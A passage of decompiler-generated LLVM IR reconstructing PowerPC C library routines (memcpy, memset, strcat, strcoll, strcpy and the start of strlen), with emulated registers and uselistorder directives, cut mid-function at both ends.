  uselistorder label %dec_label_pc_10004cc4, { 2, 0, 1 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10004cdc = load i32, i32* @r4, align 4
  %v1_10004cdc = add i32 %v0_10004cdc, -4
  store i32 %v1_10004cdc, i32* %r4.global-to-local, align 4
  %v0_10004ce0 = load i32, i32* @r3, align 4
  %v1_10004ce0 = add i32 %v0_10004ce0, -4
  store i32 %v1_10004ce0, i32* @r11, align 4
  %v0_10004ce4 = load i32, i32* @r5, align 4
  %v1_10004ce4 = call i32 @__asm_rlwinm.(i32 %v0_10004ce4, i32 29, i32 3, i32 31)
  store i32 %v1_10004ce4, i32* %r9.global-to-local, align 4
  %v4_10004ce4 = icmp eq i32 %v1_10004ce4, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v4_10004ce4, label %dec_label_pc_10004d0c, label %dec_label_pc_10004cec

dec_label_pc_10004cec:                            ; preds = %entry
  %v0_10004cec = load i32, i32* @r11, align 4
  %v1_10004cec = urem i32 %v0_10004cec, 4
  %v3_10004cec = icmp eq i32 %v1_10004cec, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_10004cec, label %dec_label_pc_10004cf4, label %dec_label_pc_10004d48

dec_label_pc_10004cf4:                            ; preds = %dec_label_pc_10004d68.dec_label_pc_10004cf4_crit_edge, %dec_label_pc_10004cec
  %v1_10004d00.pre = phi i32 [ %v0_10004cec, %dec_label_pc_10004cec ], [ %v1_10004d00.pre.pre, %dec_label_pc_10004d68.dec_label_pc_10004cf4_crit_edge ]
  %v0_10004cf4 = phi i32 [ %v1_10004ce4, %dec_label_pc_10004cec ], [ %v1_10004d68, %dec_label_pc_10004d68.dec_label_pc_10004cf4_crit_edge ]
  %.0 = phi i32 [ undef, %dec_label_pc_10004cec ], [ %v2_10004d50, %dec_label_pc_10004d68.dec_label_pc_10004cf4_crit_edge ]
  store i32 %v0_10004cf4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10004cf8

dec_label_pc_10004cf8:                            ; preds = %dec_label_pc_10004cf8, %dec_label_pc_10004cf4
  %v1_10004d00 = phi i32 [ %v2_10004d04, %dec_label_pc_10004cf8 ], [ %v1_10004d00.pre, %dec_label_pc_10004cf4 ]
  %v0_10004cf8 = load i32, i32* %r4.global-to-local, align 4
  %v1_10004cf8 = add i32 %v0_10004cf8, 4
  %v2_10004cf8 = inttoptr i32 %v1_10004cf8 to i32*
  %v3_10004cf8 = load i32, i32* %v2_10004cf8, align 4
  %v1_10004cfc = add i32 %v0_10004cf8, 8
  %v2_10004cfc = inttoptr i32 %v1_10004cfc to i32*
  %v3_10004cfc = load i32, i32* %v2_10004cfc, align 4
  store i32 %v3_10004cfc, i32* %r9.global-to-local, align 4
  store i32 %v1_10004cfc, i32* %r4.global-to-local, align 4
  %v2_10004d00 = add i32 %v1_10004d00, 4
  %v3_10004d00 = inttoptr i32 %v2_10004d00 to i32*
  store i32 %v3_10004cf8, i32* %v3_10004d00, align 4
  %v0_10004d04 = load i32, i32* %r9.global-to-local, align 4
  %v1_10004d04 = load i32, i32* @r11, align 4
  %v2_10004d04 = add i32 %v1_10004d04, 8
  %v3_10004d04 = inttoptr i32 %v2_10004d04 to i32*
  store i32 %v0_10004d04, i32* %v3_10004d04, align 4
  store i32 %v2_10004d04, i32* @r11, align 4
  %v0_10004d08 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10004d08 = add i32 %v0_10004d08, -1
  store i32 %v1_10004d08, i32* %ctr.global-to-local, align 4
  %v2_10004d08 = icmp eq i32 %v1_10004d08, 0
  br i1 %v2_10004d08, label %dec_label_pc_10004d0c, label %dec_label_pc_10004cf8

dec_label_pc_10004d0c:                            ; preds = %dec_label_pc_10004cf8, %dec_label_pc_10004d68, %entry
  %.1 = phi i32 [ undef, %entry ], [ %v2_10004d50, %dec_label_pc_10004d68 ], [ %.0, %dec_label_pc_10004cf8 ]
  %v1_10004d0c = urem i32 %.1, 8
  store i32 %v1_10004d0c, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_10004d0c, 4
  br i1 %tmp, label %dec_label_pc_10004d24, label %dec_label_pc_10004d18

dec_label_pc_10004d18:                            ; preds = %dec_label_pc_10004d0c
  %v0_10004d18 = load i32, i32* %r4.global-to-local, align 4
  %v1_10004d18 = add i32 %v0_10004d18, 4
  %v2_10004d18 = inttoptr i32 %v1_10004d18 to i32*
  %v3_10004d18 = load i32, i32* %v2_10004d18, align 4
  store i32 %v1_10004d18, i32* %r4.global-to-local, align 4
  %v1_10004d1c = add nsw i32 %v1_10004d0c, -4
  store i32 %v1_10004d1c, i32* @r5, align 4
  %v1_10004d20 = load i32, i32* @r11, align 4
  %v2_10004d20 = add i32 %v1_10004d20, 4
  %v3_10004d20 = inttoptr i32 %v2_10004d20 to i32*
  store i32 %v3_10004d18, i32* %v3_10004d20, align 4
  store i32 %v2_10004d20, i32* @r11, align 4
  %v0_10004d24.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10004d24

dec_label_pc_10004d24:                            ; preds = %dec_label_pc_10004d0c, %dec_label_pc_10004d18
  %v0_10004d24 = phi i32 [ %v1_10004d0c, %dec_label_pc_10004d0c ], [ %v0_10004d24.pre, %dec_label_pc_10004d18 ]
  %v3_10004d24 = icmp eq i32 %v0_10004d24, 0
  %v0_10004d28 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10004d24, i32 %v0_10004d28)
  %v0_10004d2c = load i32, i32* @r5, align 4
  store i32 %v0_10004d2c, i32* %ctr.global-to-local, align 4
  %v0_10004d30 = load i32, i32* %r4.global-to-local, align 4
  %v1_10004d30 = add i32 %v0_10004d30, 3
  store i32 %v1_10004d30, i32* %r4.global-to-local, align 4
  %v0_10004d34 = load i32, i32* @r11, align 4
  %v1_10004d34 = add i32 %v0_10004d34, 3
  store i32 %v1_10004d34, i32* %r9.global-to-local, align 4
  %v1_10004d388 = add i32 %v0_10004d30, 4
  %v2_10004d389 = inttoptr i32 %v1_10004d388 to i8*
  %v3_10004d3810 = load i8, i8* %v2_10004d389, align 1
  store i32 %v1_10004d388, i32* %r4.global-to-local, align 4
  %v3_10004d3c12 = add i32 %v0_10004d34, 4
  %v4_10004d3c13 = inttoptr i32 %v3_10004d3c12 to i8*
  store i8 %v3_10004d3810, i8* %v4_10004d3c13, align 1
  store i32 %v3_10004d3c12, i32* %r9.global-to-local, align 4
  %v0_10004d4014 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10004d4015 = add i32 %v0_10004d4014, -1
  store i32 %v1_10004d4015, i32* %ctr.global-to-local, align 4
  %v2_10004d4016 = icmp eq i32 %v1_10004d4015, 0
  br i1 %v2_10004d4016, label %dec_label_pc_10004d74, label %dec_label_pc_10004d38.dec_label_pc_10004d38_crit_edge

dec_label_pc_10004d38.dec_label_pc_10004d38_crit_edge: ; preds = %dec_label_pc_10004d24, %dec_label_pc_10004d38.dec_label_pc_10004d38_crit_edge
  %v3_10004d3c17 = phi i32 [ %v3_10004d3c, %dec_label_pc_10004d38.dec_label_pc_10004d38_crit_edge ], [ %v3_10004d3c12, %dec_label_pc_10004d24 ]
  %v0_10004d38.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10004d38 = add i32 %v0_10004d38.pre, 1
  %v2_10004d38 = inttoptr i32 %v1_10004d38 to i8*
  %v3_10004d38 = load i8, i8* %v2_10004d38, align 1
  store i32 %v1_10004d38, i32* %r4.global-to-local, align 4
  %v3_10004d3c = add i32 %v3_10004d3c17, 1
  %v4_10004d3c = inttoptr i32 %v3_10004d3c to i8*
  store i8 %v3_10004d38, i8* %v4_10004d3c, align 1
  store i32 %v3_10004d3c, i32* %r9.global-to-local, align 4
  %v0_10004d40 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10004d40 = add i32 %v0_10004d40, -1
  store i32 %v1_10004d40, i32* %ctr.global-to-local, align 4
  %v2_10004d40 = icmp eq i32 %v1_10004d40, 0
  br i1 %v2_10004d40, label %dec_label_pc_10004d74, label %dec_label_pc_10004d38.dec_label_pc_10004d38_crit_edge

dec_label_pc_10004d48:                            ; preds = %dec_label_pc_10004cec
  %v1_10004d48 = sub nsw i32 4, %v1_10004cec
  store i32 %v1_10004d48, i32* %ctr.global-to-local, align 4
  %v1_10004d50 = load i32, i32* @r5, align 4
  %v2_10004d50 = sub i32 %v1_10004d50, %v1_10004d48
  br label %dec_label_pc_10004d54

dec_label_pc_10004d54:                            ; preds = %dec_label_pc_10004d54, %dec_label_pc_10004d48
  %v2_10004d5c = phi i32 [ %v1_10004d60, %dec_label_pc_10004d54 ], [ %v0_10004cec, %dec_label_pc_10004d48 ]
  %v0_10004d54 = load i32, i32* %r4.global-to-local, align 4
  %v1_10004d54 = add i32 %v0_10004d54, 4
  %v2_10004d54 = inttoptr i32 %v1_10004d54 to i8*
  %v3_10004d54 = load i8, i8* %v2_10004d54, align 1
  %v1_10004d58 = add i32 %v0_10004d54, 1
  store i32 %v1_10004d58, i32* %r4.global-to-local, align 4
  %v3_10004d5c = add i32 %v2_10004d5c, 4
  %v4_10004d5c = inttoptr i32 %v3_10004d5c to i8*
  store i8 %v3_10004d54, i8* %v4_10004d5c, align 1
  %v0_10004d60 = load i32, i32* @r11, align 4
  %v1_10004d60 = add i32 %v0_10004d60, 1
  store i32 %v1_10004d60, i32* @r11, align 4
  %v0_10004d64 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10004d64 = add i32 %v0_10004d64, -1
  store i32 %v1_10004d64, i32* %ctr.global-to-local, align 4
  %v2_10004d64 = icmp eq i32 %v1_10004d64, 0
  br i1 %v2_10004d64, label %dec_label_pc_10004d68, label %dec_label_pc_10004d54

dec_label_pc_10004d68:                            ; preds = %dec_label_pc_10004d54
  %v1_10004d68 = call i32 @__asm_rlwinm.(i32 %v2_10004d50, i32 29, i32 3, i32 31)
  store i32 %v1_10004d68, i32* %r9.global-to-local, align 4
  %v4_10004d68 = icmp eq i32 %v1_10004d68, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v4_10004d68, label %dec_label_pc_10004d0c, label %dec_label_pc_10004d68.dec_label_pc_10004cf4_crit_edge

dec_label_pc_10004d68.dec_label_pc_10004cf4_crit_edge: ; preds = %dec_label_pc_10004d68
  %v1_10004d00.pre.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_10004cf4

dec_label_pc_10004d74:                            ; preds = %dec_label_pc_10004d38.dec_label_pc_10004d38_crit_edge, %dec_label_pc_10004d24
  %v0_10004d74 = load i32, i32* @r3, align 4
  ret i32 %v0_10004d74

; uselistorder directives
  uselistorder i32 %v1_10004d68, { 1, 2, 0 }
  uselistorder i32 %v1_10004d64, { 1, 0 }
  uselistorder i32 %v1_10004d60, { 1, 0 }
  uselistorder i32 %v2_10004d50, { 2, 1, 0 }
  uselistorder i32 %v1_10004d40, { 1, 0 }
  uselistorder i32 %v3_10004d3c, { 1, 2, 0 }
  uselistorder i32 %v1_10004d0c, { 3, 2, 1, 0 }
  uselistorder i32 %v1_10004d08, { 1, 0 }
  uselistorder i32 %v2_10004d04, { 1, 2, 0 }
  uselistorder i32 %v1_10004cec, { 1, 0 }
  uselistorder i32 %v0_10004cec, { 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 7, 3, 2, 0, 4, 8, 5, 10, 6, 9, 11 }
  uselistorder i32* %ctr.global-to-local, { 1, 2, 3, 5, 4, 0, 6, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_10004d38.dec_label_pc_10004d38_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10004d24, { 1, 0 }
  uselistorder label %dec_label_pc_10004d0c, { 1, 0, 2 }
}

define i32 @__GI_memset(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_10004d7c = add i32 %arg1, -4
  store i32 %v1_10004d7c, i32* %r11.global-to-local, align 4
  %v1_10004d80 = call i32 @__asm_rlwimi(i32 %arg2, i32 8, i32 16, i32 23)
  %v1_10004d84 = call i32 @__asm_rlwimi(i32 %v1_10004d80, i32 16, i32 0, i32 15)
  %v2_10004d84 = trunc i32 %v1_10004d84 to i8
  %v1_10004d88 = call i32 @__asm_rlwinm.(i32 %arg3, i32 29, i32 3, i32 31)
  store i32 %v1_10004d88, i32* %r9.global-to-local, align 4
  %v4_10004d88 = icmp eq i32 %v1_10004d88, 0
  br i1 %v4_10004d88, label %dec_label_pc_10004db0, label %dec_label_pc_10004d90

dec_label_pc_10004d90:                            ; preds = %entry
  %v0_10004d90 = load i32, i32* %r11.global-to-local, align 4
  %v1_10004d90 = urem i32 %v0_10004d90, 4
  %v3_10004d90 = icmp eq i32 %v1_10004d90, 0
  br i1 %v3_10004d90, label %dec_label_pc_10004d98, label %dec_label_pc_10004de0

dec_label_pc_10004d98:                            ; preds = %dec_label_pc_10004df8.dec_label_pc_10004d98_crit_edge, %dec_label_pc_10004d90
  %v0_10004d9c.pre = phi i32 [ %v0_10004d9c.pre.pre, %dec_label_pc_10004df8.dec_label_pc_10004d98_crit_edge ], [ %v0_10004d90, %dec_label_pc_10004d90 ]
  %v0_10004d98 = phi i32 [ %v1_10004df8, %dec_label_pc_10004df8.dec_label_pc_10004d98_crit_edge ], [ %v1_10004d88, %dec_label_pc_10004d90 ]
  store i32 %v0_10004d98, i32* %ctr.global-to-local, align 4
  %v1_10004da0 = sext i8 %v2_10004d84 to i32
  br label %dec_label_pc_10004d9c

dec_label_pc_10004d9c:                            ; preds = %dec_label_pc_10004d9c, %dec_label_pc_10004d98
  %v0_10004d9c = phi i32 [ %v1_10004da8, %dec_label_pc_10004d9c ], [ %v0_10004d9c.pre, %dec_label_pc_10004d98 ]
  %v1_10004d9c = add i32 %v0_10004d9c, 4
  store i32 %v1_10004d9c, i32* %r9.global-to-local, align 4
  %v4_10004da0 = inttoptr i32 %v1_10004d9c to i32*
  store i32 %v1_10004da0, i32* %v4_10004da0, align 4
  %v2_10004da4 = load i32, i32* %r9.global-to-local, align 4
  %v3_10004da4 = add i32 %v2_10004da4, 4
  %v4_10004da4 = inttoptr i32 %v3_10004da4 to i32*
  store i32 %v1_10004da0, i32* %v4_10004da4, align 4
  %v0_10004da8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10004da8 = add i32 %v0_10004da8, 4
  store i32 %v1_10004da8, i32* %r11.global-to-local, align 4
  %v0_10004dac = load i32, i32* %ctr.global-to-local, align 4
  %v1_10004dac = add i32 %v0_10004dac, -1
  store i32 %v1_10004dac, i32* %ctr.global-to-local, align 4
  %v2_10004dac = icmp eq i32 %v1_10004dac, 0
  br i1 %v2_10004dac, label %dec_label_pc_10004db0, label %dec_label_pc_10004d9c

dec_label_pc_10004db0:                            ; preds = %dec_label_pc_10004d9c, %dec_label_pc_10004df8, %entry
  %v0_10004db0 = load i32, i32* %r5.global-to-local, align 4
  %v1_10004db0 = urem i32 %v0_10004db0, 8
  store i32 %v1_10004db0, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_10004db0, 4
  br i1 %tmp, label %dec_label_pc_10004dc4, label %dec_label_pc_10004dbc

dec_label_pc_10004dbc:                            ; preds = %dec_label_pc_10004db0
  %v1_10004dbc = sext i8 %v2_10004d84 to i32
  %v2_10004dbc = load i32, i32* %r11.global-to-local, align 4
  %v3_10004dbc = add i32 %v2_10004dbc, 4
  %v4_10004dbc = inttoptr i32 %v3_10004dbc to i32*
  store i32 %v1_10004dbc, i32* %v4_10004dbc, align 4
  store i32 %v3_10004dbc, i32* %r11.global-to-local, align 4
  %v0_10004dc0 = load i32, i32* @r5, align 4
  %v1_10004dc0 = add i32 %v0_10004dc0, -4
  store i32 %v1_10004dc0, i32* @r5, align 4
  br label %dec_label_pc_10004dc4

dec_label_pc_10004dc4:                            ; preds = %dec_label_pc_10004db0, %dec_label_pc_10004dbc
  %v0_10004dc4 = phi i32 [ %v1_10004db0, %dec_label_pc_10004db0 ], [ %v1_10004dc0, %dec_label_pc_10004dbc ]
  %v3_10004dc4 = icmp eq i32 %v0_10004dc4, 0
  %v0_10004dc8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10004dc4, i32 %v0_10004dc8)
  %v0_10004dcc = load i32, i32* @r5, align 4
  store i32 %v0_10004dcc, i32* %ctr.global-to-local, align 4
  %v0_10004dd0 = load i32, i32* %r11.global-to-local, align 4
  %v1_10004dd0 = add i32 %v0_10004dd0, 3
  store i32 %v1_10004dd0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10004dd4

dec_label_pc_10004dd4:                            ; preds = %dec_label_pc_10004dd4, %dec_label_pc_10004dc4
  %v3_10004dd4 = phi i32 [ %v4_10004dd4, %dec_label_pc_10004dd4 ], [ %v1_10004dd0, %dec_label_pc_10004dc4 ]
  %v4_10004dd4 = add i32 %v3_10004dd4, 1
  %v5_10004dd4 = inttoptr i32 %v4_10004dd4 to i8*
  store i8 %v2_10004d84, i8* %v5_10004dd4, align 1
  store i32 %v4_10004dd4, i32* %r9.global-to-local, align 4
  %v0_10004dd8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10004dd8 = add i32 %v0_10004dd8, -1
  store i32 %v1_10004dd8, i32* %ctr.global-to-local, align 4
  %v2_10004dd8 = icmp eq i32 %v1_10004dd8, 0
  br i1 %v2_10004dd8, label %dec_label_pc_10004e04, label %dec_label_pc_10004dd4

dec_label_pc_10004de0:                            ; preds = %dec_label_pc_10004d90
  %v1_10004de0 = sub nsw i32 4, %v1_10004d90
  store i32 %v1_10004de0, i32* %ctr.global-to-local, align 4
  %v1_10004de8 = load i32, i32* %r5.global-to-local, align 4
  %v2_10004de8 = sub i32 %v1_10004de8, %v1_10004de0
  store i32 %v2_10004de8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10004dec

dec_label_pc_10004dec:                            ; preds = %dec_label_pc_10004dec, %dec_label_pc_10004de0
  %v3_10004dec = phi i32 [ %v1_10004df0, %dec_label_pc_10004dec ], [ %v0_10004d90, %dec_label_pc_10004de0 ]
  %v4_10004dec = add i32 %v3_10004dec, 4
  %v5_10004dec = inttoptr i32 %v4_10004dec to i8*
  store i8 %v2_10004d84, i8* %v5_10004dec, align 1
  %v0_10004df0 = load i32, i32* %r11.global-to-local, align 4
  %v1_10004df0 = add i32 %v0_10004df0, 1
  store i32 %v1_10004df0, i32* %r11.global-to-local, align 4
  %v0_10004df4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10004df4 = add i32 %v0_10004df4, -1
  store i32 %v1_10004df4, i32* %ctr.global-to-local, align 4
  %v2_10004df4 = icmp eq i32 %v1_10004df4, 0
  br i1 %v2_10004df4, label %dec_label_pc_10004df8, label %dec_label_pc_10004dec

dec_label_pc_10004df8:                            ; preds = %dec_label_pc_10004dec
  %v0_10004df8 = load i32, i32* %r5.global-to-local, align 4
  %v1_10004df8 = call i32 @__asm_rlwinm.(i32 %v0_10004df8, i32 29, i32 3, i32 31)
  store i32 %v1_10004df8, i32* %r9.global-to-local, align 4
  %v4_10004df8 = icmp eq i32 %v1_10004df8, 0
  br i1 %v4_10004df8, label %dec_label_pc_10004db0, label %dec_label_pc_10004df8.dec_label_pc_10004d98_crit_edge

dec_label_pc_10004df8.dec_label_pc_10004d98_crit_edge: ; preds = %dec_label_pc_10004df8
  %v0_10004d9c.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10004d98

dec_label_pc_10004e04:                            ; preds = %dec_label_pc_10004dd4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_10004df8, { 1, 2, 0 }
  uselistorder i32 %v1_10004df4, { 1, 0 }
  uselistorder i32 %v1_10004df0, { 1, 0 }
  uselistorder i32 %v1_10004dd8, { 1, 0 }
  uselistorder i32 %v4_10004dd4, { 1, 2, 0 }
  uselistorder i32 %v1_10004db0, { 2, 1, 0 }
  uselistorder i32 %v1_10004dac, { 1, 0 }
  uselistorder i32 %v1_10004da8, { 1, 0 }
  uselistorder i32 %v1_10004d90, { 1, 0 }
  uselistorder i32 %v0_10004d90, { 2, 1, 0 }
  uselistorder i8 %v2_10004d84, { 1, 3, 2, 0 }
  uselistorder i32* %r9.global-to-local, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 3, 4, 0, 2, 1 }
  uselistorder i32* %r11.global-to-local, { 3, 6, 5, 7, 8, 4, 0, 1, 2 }
  uselistorder i32* %ctr.global-to-local, { 3, 4, 5, 6, 7, 8, 0, 1, 2 }
  uselistorder label %dec_label_pc_10004dc4, { 1, 0 }
  uselistorder label %dec_label_pc_10004db0, { 1, 0, 2 }
}

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_10004e0c

dec_label_pc_10004e0c:                            ; preds = %dec_label_pc_10004e0c, %entry
  %v0_10004e0c = phi i32 [ %v1_10004e10, %dec_label_pc_10004e0c ], [ %tmp, %entry ]
  %v1_10004e0c = inttoptr i32 %v0_10004e0c to i8*
  %v2_10004e0c = load i8, i8* %v1_10004e0c, align 1
  %v1_10004e10 = add i32 %v0_10004e0c, 1
  %v3_10004e14 = icmp eq i8 %v2_10004e0c, 0
  store i1 %v3_10004e14, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10004e14, label %dec_label_pc_10004e1c, label %dec_label_pc_10004e0c

dec_label_pc_10004e1c:                            ; preds = %dec_label_pc_10004e0c
  %v1_10004e1c = add i32 %v0_10004e0c, -1
  br label %dec_label_pc_10004e20

dec_label_pc_10004e20:                            ; preds = %dec_label_pc_10004e20, %dec_label_pc_10004e1c
  %v2_10004e2c = phi i32 [ %v3_10004e2c, %dec_label_pc_10004e20 ], [ %v1_10004e1c, %dec_label_pc_10004e1c ]
  %v0_10004e20 = load i32, i32* @r4, align 4
  %v1_10004e20 = inttoptr i32 %v0_10004e20 to i8*
  %v2_10004e20 = load i8, i8* %v1_10004e20, align 1
  %v1_10004e24 = add i32 %v0_10004e20, 1
  store i32 %v1_10004e24, i32* @r4, align 4
  %v3_10004e28 = icmp eq i8 %v2_10004e20, 0
  store i1 %v3_10004e28, i1* %cr7_eq.global-to-local, align 1
  %v3_10004e2c = add i32 %v2_10004e2c, 1
  %v4_10004e2c = inttoptr i32 %v3_10004e2c to i8*
  store i8 %v2_10004e20, i8* %v4_10004e2c, align 1
  %v0_10004e30 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004e30, label %dec_label_pc_10004e34, label %dec_label_pc_10004e20

dec_label_pc_10004e34:                            ; preds = %dec_label_pc_10004e20
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v3_10004e2c, { 1, 0 }
  uselistorder i32 %v0_10004e0c, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_10004e44.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10004e3c

dec_label_pc_10004e3c:                            ; preds = %dec_label_pc_10004e60, %entry
  %v0_10004e44 = phi i32 [ %v1_10004e48, %dec_label_pc_10004e60 ], [ %v0_10004e44.pre, %entry ]
  %v0_10004e3c = phi i32 [ %v1_10004e40, %dec_label_pc_10004e60 ], [ %tmp, %entry ]
  %v1_10004e3c = inttoptr i32 %v0_10004e3c to i8*
  %v2_10004e3c = load i8, i8* %v1_10004e3c, align 1
  %v3_10004e3c = zext i8 %v2_10004e3c to i32
  %v1_10004e44 = inttoptr i32 %v0_10004e44 to i8*
  %v2_10004e44 = load i8, i8* %v1_10004e44, align 1
  %v3_10004e44 = zext i8 %v2_10004e44 to i32
  %v3_10004e4c = icmp eq i8 %v2_10004e3c, 0
  br i1 %v3_10004e4c, label %dec_label_pc_10004e58, label %dec_label_pc_10004e60

dec_label_pc_10004e58:                            ; preds = %dec_label_pc_10004e3c
  %v1_10004e58 = sub nsw i32 0, %v3_10004e44
  ret i32 %v1_10004e58

dec_label_pc_10004e60:                            ; preds = %dec_label_pc_10004e3c
  %v4_10004e50 = icmp eq i8 %v2_10004e3c, %v2_10004e44
  %v1_10004e48 = add i32 %v0_10004e44, 1
  %v1_10004e40 = add i32 %v0_10004e3c, 1
  br i1 %v4_10004e50, label %dec_label_pc_10004e3c, label %dec_label_pc_10004e64

dec_label_pc_10004e64:                            ; preds = %dec_label_pc_10004e60
  %v2_10004e64 = sub nsw i32 %v3_10004e3c, %v3_10004e44
  ret i32 %v2_10004e64

; uselistorder directives
  uselistorder i32 %v3_10004e44, { 1, 0 }
  uselistorder i32 %v0_10004e3c, { 1, 0 }
  uselistorder i32 %v0_10004e44, { 1, 0 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_10004e6c = add i32 %arg1, -1
  %v1_10004e70 = sub i32 %v2_10004e6c, %tmp
  store i32 %v1_10004e70, i32* %r9.global-to-local, align 4
  %v2_10004e744 = load i8, i8* %arg2, align 1
  %v1_10004e786 = add i32 %tmp, 1
  store i32 %v1_10004e786, i32* %r4.global-to-local, align 4
  %v3_10004e7c8 = icmp eq i8 %v2_10004e744, 0
  store i1 %v3_10004e7c8, i1* %cr7_eq.global-to-local, align 1
  %v5_10004e809 = inttoptr i32 %arg1 to i8*
  store i8 %v2_10004e744, i8* %v5_10004e809, align 1
  %v0_10004e8410 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004e8410, label %dec_label_pc_10004e88, label %dec_label_pc_10004e74.dec_label_pc_10004e74_crit_edge

dec_label_pc_10004e74.dec_label_pc_10004e74_crit_edge: ; preds = %entry, %dec_label_pc_10004e74.dec_label_pc_10004e74_crit_edge
  %v0_10004e74.pre = load i32, i32* %r4.global-to-local, align 4
  %v2_10004e80.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10004e74 = inttoptr i32 %v0_10004e74.pre to i8*
  %v2_10004e74 = load i8, i8* %v1_10004e74, align 1
  %v1_10004e78 = add i32 %v0_10004e74.pre, 1
  store i32 %v1_10004e78, i32* %r4.global-to-local, align 4
  %v3_10004e7c = icmp eq i8 %v2_10004e74, 0
  store i1 %v3_10004e7c, i1* %cr7_eq.global-to-local, align 1
  %v4_10004e80 = add i32 %v1_10004e78, %v2_10004e80.pre
  %v5_10004e80 = inttoptr i32 %v4_10004e80 to i8*
  store i8 %v2_10004e74, i8* %v5_10004e80, align 1
  %v0_10004e84 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004e84, label %dec_label_pc_10004e88, label %dec_label_pc_10004e74.dec_label_pc_10004e74_crit_edge

dec_label_pc_10004e88:                            ; preds = %dec_label_pc_10004e74.dec_label_pc_10004e74_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10004e74.dec_label_pc_10004e74_crit_edge, { 1, 0 }
}

define i32 @__GI_strlen() local_unnamed_addr {
entry:
  %v0_10004e8c = load i32, i32* @r3, align 4
  %v1_10004ea43 = urem i32 %v0_10004e8c, 4
  %v3_10004ea45 = icmp eq i32 %v1_10004ea43, 0
  br i1 %v3_10004ea45, label %dec_label_pc_10004eac, label %dec_label_pc_10004e94

dec_label_pc_10004e94:                            ; preds = %entry, %dec_label_pc_10004ea0
  %v0_10004ea0 = phi i32 [ %v1_10004ea0, %dec_label_pc_10004ea0 ], [ %v0_10004e8c, %entry ]
  %v1_10004e94 = inttoptr i32 %v0_10004ea0 to i8*
  %v2_10004e94 = load i8, i8* %v1_10004e94, align 1
  %v3_10004e98 = icmp eq i8 %v2_10004e94, 0
  br i1 %v3_10004e98, label %dec_label_pc_10004ee0, label %dec_label_pc_10004ea0

dec_label_pc_10004ea0:                            ; preds = %dec_label_pc_10004e94
  %v1_10004ea0 = add i32 %v0_10004ea0, 1
  %v1_10004ea4 = urem i32 %v1_10004ea0, 4
  %v3_10004ea4 = icmp eq i32 %v1_10004ea4, 0
  br i1 %v3_10004ea4, label %dec_label_pc_10004eac, label %dec_label_pc_10004e94

dec_label_pc_10004eac:                            ; preds = %dec_label_pc_10004ea0, %entry
  %v0_10004eb0 = phi i32 [ %v0_10004e8c, %entry ], [ %v1_10004ea0, %dec_label_pc_10004ea0 ]
  br label %dec_label_pc_10004eb8

dec_label_pc_10004eb8:                            ; preds = %dec_label_pc_10004f18, %dec_label_pc_10004eb8, %dec_label_pc_10004eac
  %v1_10004ef4 = phi i32 [ %v0_10004eb0, %dec_label_pc_10004eac ], [ %v1_10004ebc, %dec_label_pc_10004eb8 ], [ %v1_10004ebc, %dec_label_pc_10004f18 ]
  %v1_10004eb8 = inttoptr i32 %v1_10004ef4 to i32*
  %v2_10004eb8 = load i32, i32* %v1_10004eb8, align 4
  %v1_10004ebc = add i32 %v1_10004ef4, 4
